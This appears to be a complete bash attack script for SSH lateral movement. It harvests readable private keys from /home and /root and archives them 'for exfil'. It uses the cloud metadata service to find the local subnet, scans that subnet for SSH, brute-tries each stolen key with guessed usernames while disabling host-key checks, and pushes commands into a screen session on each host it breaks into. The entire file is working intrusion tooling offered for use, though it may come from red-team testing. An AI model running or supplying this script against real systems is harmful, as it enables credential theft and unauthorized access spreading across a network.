#!/usr/bin/env bash
set -Eeuo pipefail
IFS=$'\n\t'

##############################################################################
# Configuration ­- tweak if you like
##############################################################################
KEY_DIRS=("/home" "/root")       # search roots for keys
PORTS=(22)                       # ports to scan; add 2222 etc. if needed
SSH_USER_GUESSES=(root ubuntu ec2-user)  # fallbacks if username isn’t encoded in key path
COMMAND_TO_RUN=                  # e.g. "whoami"; leave blank for full shell
SCREEN_SESSION=ssh_hop
SCAN_TIMEOUT=1                   # seconds nc waits on each host:port
KEY_FIND_TIMEOUT=40              # overall limit for grep search
SUCCESSFUL_CONNECTIONS=()

##############################################################################
# Behaviour on successful login
##############################################################################
COMMANDS=("whoami" "uname -a" "touch /tmp/lateral_pwned.txt")   # commands to push, in order
COMMAND_DELAY=2                  # seconds to wait between pushes
KEEP_SESSION_OPEN=false          # true = leave SSH alive after commands

##############################################################################
# Helpers
##############################################################################
log() { printf '[%s] %s\n' "$(date -Is)" "$*"; }

ip2int() { local IFS=.; read -r a b c d <<<"$1"; echo $(((a<<24)|(b<<16)|(c<<8)|d)); }
int2ip() { printf '%d.%d.%d.%d\n' "$((($1>>24)&255))" "$((($1>>16)&255))" "$((($1>>8)&255))" "$(($1&255))"; }

scan_port() {                     # $1=ip $2=port
  if command -v nc &>/dev/null; then
    nc -z -w "$SCAN_TIMEOUT" "$1" "$2" &>/dev/null
  else
    (exec 3<>/dev/tcp/"$1"/"$2") &>/dev/null
  fi
}

run_via_screen() {               # $1=host $2=key $3=user
  local sess="${SCREEN_SESSION}_$(date +%s)"
  log "📺  Launching detached screen '$sess' → $3@$1"

  # -tt forces a TTY so remote shell thinks it's interactive
  screen -dmS "$sess" \
        ssh -tt -i "$2" -o StrictHostKeyChecking=no "$3@$1"

  # Give SSH a moment to present a shell prompt
  sleep 2

  for cmd in "${COMMANDS[@]}"; do
    log "➡️   $cmd"
    screen -S "$sess" -X stuff "$cmd\n"
    sleep "$COMMAND_DELAY"
  done

  if ! $KEEP_SESSION_OPEN; then
    log "🚪  Closing session '$sess'"
    screen -S "$sess" -X quit
  else
    log "🔑  Session '$sess' left open — attach with:  screen -r $sess"
  fi
}

##############################################################################
# 1. Discover readable private keys
##############################################################################
log "🔍  Discovering private keys (timeout ${KEY_FIND_TIMEOUT}s)..."
mapfile -t KEY_FILES < <(
  timeout "$KEY_FIND_TIMEOUT" grep -rl --exclude='*.pub' \
    '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' "${KEY_DIRS[@]}" 2>/dev/null || true
)

if ((${#KEY_FILES[@]}==0)); then
  log "❌  No private keys found - aborting."
  exit 0
fi
log "✅  Found ${#KEY_FILES[@]} key(s):"
printf '  %s\n' "${KEY_FILES[@]}"

# Optional archive for exfil/testing
tar -czf /tmp/ssh_keys.tgz --transform='s#^/#keys/#' "${KEY_FILES[@]}" 2>/dev/null || true

##############################################################################
# 2. Scan the local subnet for open SSH ports
##############################################################################
CIDR=$(ip -o -f inet addr show | awk '/scope global/ {print $4; exit}')
IP=${CIDR%%/*}
PREFIX=${CIDR##*/}

if [[ $PREFIX -eq 32 ]]; then
  # ── Google Cloud quirk ──
  METADATA="http://metadata.google.internal/computeMetadata/v1"
  H="Metadata-Flavor: Google"

  # 1) try subnet-ipv4-range (already CIDR)
  if CIDR_META=$(curl -fs -H "$H" "$METADATA/instance/network-interfaces/0/subnet-ipv4-range" 2>/dev/null); then
      IP=${CIDR_META%%/*}
      PREFIX=${CIDR_META##*/}
      log "🌐 Using subnet from metadata: $CIDR_META"

  # 2) fall back to subnetmask (e.g. 255.255.255.0)
  elif MASK_DOTTED=$(curl -fs -H "$H" "$METADATA/instance/network-interfaces/0/subnetmask" 2>/dev/null); then
      # convert dotted mask → prefix
      IFS=. read -r o1 o2 o3 o4 <<<"$MASK_DOTTED"
      PREFIX=$(printf '%d\n' "$(( (o1<<24 | o2<<16 | o3<<8 | o4 ) ))" \
                     | awk '{print gsub("1","")}' <<<"$(bc <<<"obase=2;$((o1<<24|o2<<16|o3<<8|o4))")")
      log "🌐 Using mask $MASK_DOTTED → /$PREFIX from metadata"

  # 3) last-ditch default
  else
      PREFIX=24
      log "⚠️ /32 with no metadata — defaulting to /24"
  fi
fi

MASK=$(( (0xFFFFFFFF << (32-PREFIX)) & 0xFFFFFFFF ))
NET_INT=$(( $(ip2int "$IP") & MASK ))
HOSTS=$(( 1 << (32-PREFIX) ))

log "🌐  Scanning subnet $CIDR for TCP/${PORTS[*]}..."
declare -a OPEN_HOSTS=()
for ((off=1; off<HOSTS-1; off++)); do   # skip network .0 and broadcast
  tgt=$(int2ip $((NET_INT+off)))
  for p in "${PORTS[@]}"; do
    log "🔎  Scanning $tgt:$p..."
    if scan_port "$tgt" "$p"; then
      OPEN_HOSTS+=("$tgt")
      log "  ➜ $tgt:$p open"
      break        # no need to try other ports on same host
    fi
  done
done

if ((${#OPEN_HOSTS[@]}==0)); then
  log "❌  No hosts with SSH open - aborting."
  exit 0
fi
log "✅  Found ${#OPEN_HOSTS[@]} host(s) with SSH open."

##############################################################################
# 3. Attempt SSH with each key ↦ host until success
##############################################################################
attempt_login() {                # $1=host $2=key $3=username
  ssh -i "$2" -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no \
      "$3@$1" exit &>/dev/null
}

for host in "${OPEN_HOSTS[@]}"; do
  for key in "${KEY_FILES[@]}"; do
    # crude username guess based on key path; fallbacks in list
    # -------- pick a first-guess username from the key path --------
    if [[ $key == /home/*/.ssh/* ]]; then            #  /home/<user>/.ssh/<file>
        user_guess=${key#/home/}                     # strip leading “/home/”
        user_guess=${user_guess%%/*}                 # keep text up to first /
    elif [[ $key == /root/* ]]; then                 #  /root/…
        user_guess=root
    else                                             # fall back to filename heuristics
        user_guess=$(basename "$key")                # e.g.  id_rsa_ec2-user
        user_guess=${user_guess%%_*}                 # -> id
    fi
    for user in "$user_guess" "${SSH_USER_GUESSES[@]}"; do
      log "🔑  Trying $key → $user@$host ..."
      if attempt_login "$host" "$key" "$user"; then
        log "🎉  SUCCESS using $key → $user@$host"
        SUCCESSFUL_CONNECTIONS+=("$host:$user:$key")
        log "🔑  Running commands via screen session '$SCREEN_SESSION'..."
        run_via_screen "$host" "$key" "$user"
      fi
    done
  done
done

if ((${#SUCCESSFUL_CONNECTIONS[@]} > 0)); then
  log "✅  Successful connections:"
  printf '  %s\n' "${SUCCESSFUL_CONNECTIONS[@]}"
else
  log "❌  No successful connections made."
fi
exit 0